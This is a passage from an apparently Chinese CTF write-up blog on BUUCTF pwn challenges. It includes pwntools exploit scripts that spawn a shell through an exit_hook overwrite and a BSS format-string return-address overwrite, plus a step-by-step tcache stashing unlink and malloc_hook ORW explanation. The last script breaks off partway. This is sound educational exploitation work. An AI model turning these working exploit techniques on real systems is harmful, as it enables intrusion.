elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28961</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'choice-> '</span>

menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_index_words <span class="token operator">=</span> <span class="token string">''</span>
add_size_words <span class="token operator">=</span> <span class="token string">'Length: '</span>
add_content_words <span class="token operator">=</span> <span class="token string">'name:'</span>

menu_del <span class="token operator">=</span> <span class="token number">22</span>
del_index_words <span class="token operator">=</span> <span class="token string">'Idx: '</span>

menu_show <span class="token operator">=</span> <span class="token number">3</span>
show_index_words <span class="token operator">=</span> <span class="token string">''</span>

menu_edit <span class="token operator">=</span> <span class="token number">2</span>
edit_index_words <span class="token operator">=</span> <span class="token string">''</span>
edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_name_words <span class="token operator">=</span> <span class="token string">'name:'</span>
edit_content_words <span class="token operator">=</span> <span class="token string">'contents:'</span>


<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> del_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>del_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> show_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>show_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_name_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>edit_name_words<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">666</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x6f690</span>
leak_info<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
system<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
exit_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x5f0f48</span>
para <span class="token operator">=</span> libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x5f0948</span>
<span class="token comment"># pause()</span>
debug<span class="token punctuation">(</span><span class="token punctuation">)</span>
gadgets<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x18</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>exit_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># edit(name='b',content=p64(libc.address+gadgets[3]))</span>
edit<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">b'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>para<span class="token punctuation">)</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
<span class="token comment"># debug('b *$rebase(0xACF)')</span>

sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span><span class="token string">b'c'</span><span class="token punctuation">)</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="22-BUU-npuctf-2020-level2（BSS上格式化字符串）"><a href="#22-BUU-npuctf-2020-level2（BSS上格式化字符串）" class="headerlink" title="22.BUU npuctf_2020_level2（BSS上格式化字符串）"></a>22.BUU npuctf_2020_level2（BSS上格式化字符串）</h2><p>一道简单的非栈上格式化字符串，没有记录过，所以记录一下，程序很简单的格式化字符串，输入测试，可以看到，我们可以泄露出libc地址以及栈地址。</p>
<p><img src="/images/v2-2d8620b4a16519e5118d874ce8886a3a_720w.png" alt="img"></p>
<p><img src="/images/v2-bc2b811f81d2e07ca1407c683853a002_720w.png" alt="img"></p>
<p>对于格式化字符串，一般都是先泄露libc地址，再通过%c%n的方法改写入system或one_gadget地址，但非栈上格式化字符串(BSS上，堆上)是无法将想要改写的地址指针放置在栈上，也就是无法直接使用%XXc$XXp + addr，去往指定地址写入内容，这种情况需要利用<strong>地址链</strong>完成任意地址写操作。常使用<strong>rbp指针链</strong>、<strong>args参数链</strong>，如果用rbp指针链进行攻击，注意最后退出函数的时候，需要把rbp指针链恢复为原始状态</p>
<p>利用rbp附近的指针链来实现修改。最后的目标是修改返回地址，如果格式化字符串在栈上我们就可以泄露出返回地址并直接向其写入我们的one_gadget，但因为在BSS上，所以需要利用到指针链，利用 0x7fffffffe008处的指针链，修改其中的0x7fffffffe3c2为返回地址，而0x7fffffffe3c2也在栈上，再rbp+0xe8处，我们同样可以利用格式化字符串漏洞修改，在被修改为返回地址后我们对其进行修改，修改为one_gadgets，就可以成功getshell了。</p>
<p>注意：为了让程序能把所有printf的打印完再继续下一步，所以会使用sh.sendafter(‘\xb4’,payload)，防止没有输出完。这样就可以成功getshell，不这样的话是会出错的。</p>
<p>给出exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">27400</span> <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
debug<span class="token punctuation">(</span><span class="token string">'bcall printf'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'%7$p,%9$p'</span><span class="token punctuation">)</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x21b97</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>
stack_addr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
stack_1<span class="token operator">=</span>stack_addr<span class="token operator">-</span><span class="token number">0x2ea</span>
ret_addr <span class="token operator">=</span> stack_addr<span class="token operator">-</span><span class="token number">0xe0</span>


one_gadget<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x4f2be</span><span class="token punctuation">,</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span><span class="token number">0x4f322</span><span class="token punctuation">,</span><span class="token number">0x10a38c</span><span class="token punctuation">]</span>
gadget <span class="token operator">=</span> one_gadget<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
leak_info<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'stack_addr'</span><span class="token punctuation">,</span>stack_addr<span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'ret_addr'</span><span class="token punctuation">,</span>ret_addr<span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'gadget'</span><span class="token punctuation">,</span>gadget<span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">"%&#123;&#125;c%9$hn"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ret_addr <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">"%&#123;&#125;c%35$hhn"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>gadget <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'\xb4'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">"%&#123;&#125;c%9$hn"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ret_addr<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'\xb4'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">"%&#123;&#125;c%35$hhn"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>gadget<span class="token operator">>></span><span class="token number">8</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'\xb4'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">"%&#123;&#125;c%9$hn"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ret_addr<span class="token operator">+</span><span class="token number">2</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'\xb4'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">"%&#123;&#125;c%35$hhn"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>gadget<span class="token operator">>></span><span class="token number">16</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'\xb4'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'66666666\x00'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="23-BUU-hitcon-ctf-2019-one-punch（tcache-stashing-unlink-attack，堆上rop？）"><a href="#23-BUU-hitcon-ctf-2019-one-punch（tcache-stashing-unlink-attack，堆上rop？）" class="headerlink" title="23.BUU hitcon_ctf_2019_one_punch（tcache stashing unlink attack，堆上rop？）"></a>23.BUU hitcon_ctf_2019_one_punch（tcache stashing unlink attack，堆上rop？）</h2><p>又学到了很多，做了很久，之前都没有做到过tcache stashing unlink attack的题目，这道受益良多，记录一下</p>
<p>一道菜单题，在开始前申请了一个chunk再释放，并把堆地址+0x10给保存了下来</p>
<p><img src="/images/v2-ef5121893f71f6a164296679262e928e_720w.png" alt="img"></p>
<p>add中，进行的输入是先写入一个字符串数组再把里面的值给copy进通过calloc申请的空间（很重要，这是后面拿到flag很关键的一步）。且限制了calloc的chunk大小要大于等于0x80，小于等于0x400</p>
<p><img src="/images/v2-024c27cff060625ecafaa49357a0e66c_720w.png" alt="img"></p>
<p>edit和show没什么好说的，delete存在uaf漏洞：</p>
<p><img src="/images/v2-4e3b2350bdbc6e22d2e54aa4afb97723_720w.png" alt="img"></p>
<p>还有一个vuln函数，首先会判断堆地址加上0x20的值是否大于6，大于了会通过malloc奉陪一个大小为0x217的chunk，并输出其中的值 </p>
<p><img src="/images/v2-7eadddb0e33cabdef775649f16fca80a_720w.png" alt="img"></p>
<p>且这道题加了沙箱，需要打orw（但看题目没看到加了）</p>
<p>思考这道题目的思路:</p>
<ul>
<li>有一个UAF漏洞，最简单的，泄露libc地址后，使用UAF打freehook，但是这道题目的add使用的是calloc，calloc的特点是不会从tcache中取chunk，所以不能使用，且因为只能打orw，free_hook在这道题无法满足，不能打</li>
<li>在vuln中有malloc，但要想malloc，就需要满足堆地址+0x30位置的值大于6，想要任意地址写入一个大值（不可控），我们会考虑到unsortbin attack，但这道题目是在glibc2.29下的，unsortbin会加入检查机制，unsortbin attack失效</li>
<li>考虑tcache stashing unlink attack，也可以实现向一个地址写入大值（不可控）的目的，tcache stashing unlink attack的利用条件和原理是：</li>
<li>能够修改smallbin中的chunk的bk值</li>
<li>至少可以使用一次calloc </li>
<li>相同大小的chunk在smallbin和tcache 中共有8个（为什么可以看题目详解）</li>
<li>在构造好8个后，修改最后一个smallbin的bk值为我们想要修改的位置，add一个这个smallbin大小的chunk，就会从smallbin中取出第一个，在这个时候，如果tcache不是满的，那么就会将smallbin中的chunk取出并填充到tcache中，这时候我们想要修改位置的fd就会被修改成一个大值（不可控）</li>
<li>这道题目都可以满足，所以我们的思路就是利用 tcache stashing unlink attack修改堆地址+0x30位置的值，得到malloc，malloc就可以利用UAF了，释放一个chunk到tcache ，将其fd改为malloc_hook，通过malloc取出malloc_hook，打orw</li>
<li>为什么要打malloc_hook而不是别的，如何打orw，第一个问题，这道题目的add写content的时候是先将content写到栈上，再复制到堆上，所以栈上会残留有我们的gadgets，观察在call__malloc_hook 时rsp距离我们的gadgets的位置，修改malloc_hook为一个跳转到那里的gadget，执行流就到我们的gadgets，顺利执行orw了。</li>
</ul>
<p>思路记录完了，记录一下一些关键流程：</p>
<p>首先是如何构造tcache stashing unlink attack的利用条件，如何在只有calloc的条件下，在tcache中放6个chunk，smallbin中放两个，因为calloc，所以我们只要申请释放6次，就可以在tcache中得到6个chunk。并同时泄露堆地址</p>
<p><img src="/images/v2-448be107984055c97f66d1747e24c55f_720w.png" alt="img"></p>
<p><img src="/images/v2-eb36717192c94826efd9c0cd5ee1830e_720w.png" alt="img"></p>
<p>而要往smallbin中放入chunk，我们要利用unsortbin的机制，我们知道，如果unsortbin中有chunk的话，申请的时候会遍历他们，如果有刚好合适的就取出，如果有大于想要的，就切割，剩余的放回unsortbin。如果想要的比unsortbin中的都大，那就将unsortbin中的chunk全都放在他们大小该在的地方（smallbin，largebin）</p>
<p>这里我们就这样利用，我们这里想利用来做的tcache stashing unlink attack的chunk的大小为0xa0，那我们在构造好其tcache 后，用一个更大的chunk链（这里用的0x410的），让其进入unsortbin，将其切割，只剩下0xa0残留在unsortbin中，然后再取一个大于0xa0的chunk，这个0xa0就会进入smallbin了，这样再重复一次，就可以得到两个在smallbin中的chunk了，而且，在进入unsortbin后，我们还可以顺便泄露libc地址：</p>
<p><img src="/images/v2-677bd322b036405341c377f480b93c3a_720w.png" alt="img"></p>
<p><img src="/images/v2-06ff5bbee2b653539d13d4f5572406c7_720w.png" alt="img"></p>
<p>接下来就是利用tcache stashing unlink attack了，因为smallbin是先进先出的结构，所以我们add一个这个大小的chunk，先加入的chunk(chunk1)就会被取走，smallbin中后加入的chunk（chunk2）就会进入到tcache中，我们修改后加入的chunk的bk值为我们想要修改的堆地址+0x30位置（-0x10），图中画框的就是修改的bk指向的，这时候smallbin发生了corrupted，为什么呢，因为如果没有修改，chunk1的fd指向main_arena,bk指向chunk2，而chunk2的fd指向chunk1，bk指向main_arena，chunk2 的bk被修改，不再指向main_arena，所以出错。</p>
<p><img src="/images/v2-b0b3362bce8c4a705d49fe2a1327bae5_720w.png" alt="img"></p>
<p><img src="/images/v2-393efeac789f4f895b984b586bbf3f67_720w.png" alt="img"></p>
<p>接下来就是add一个大小为0xa0的chunk了，相当于chunk1被取走，这时候tcache 不满，chunk2就会加入tcache，而chunk2的bk指向的地址本来也想加入tcache，但因为满了，所以无法加入，而是在fd处被写入了一个大值（就是main_arena+240）。因为这个fakechunk通过chunk2的bk被看做加入了smallbin，chunk1被add走，chunk2被放入tcache，那么其fd就被指向了main_arena+240（我自己想的，不知道对不对）</p>
<p><img src="/images/v2-bee39b6c31c579e8e837c1515e01ca23_720w.png" alt="img"></p>
<p><strong>这里有个问题,如果chunk2进入了tcache后tcache没有满，那么就会尝试将fakechunk加入tcache，但这样会加入失败并导致整个程序崩溃，问了下说是指针不合法导致的，但具体怎么回事，不太懂了，反正就是会崩溃。所以让他不要尝试往tcache里加入就好了</strong></p>
<p>这样我们就成功修改了堆地址+0x30的地方为一个大值，就可以使用vuln函数中的malloc了。首先释放一个malloc会用到的大小的chunk近fastbin，并修改其指向malloc_hook，利用vuln函数取两次取出malloc_hook，写orw</p>
<p>接下来就是思考怎么写orw了，前面说过了，我们需要利用add方法里的将content写到栈上来，我们先观察在call <code>__malloc_hook</code>的时候栈的情况，可以看到我们的rop距离rsp是0x48，所以我们往__malloc_hook里写一个add rsp, 0x48的gadget，这样就可以执行我们的orw了， </p>
<p><img src="/images/v2-67a4d79e23f826d3f5ab229a13aed06a_720w.png" alt="img"></p>
<p><img src="/images/v2-734636986e51f627a943800e06114741_720w.png" alt="img"></p>
<p> 给出exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27951</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'> '</span>

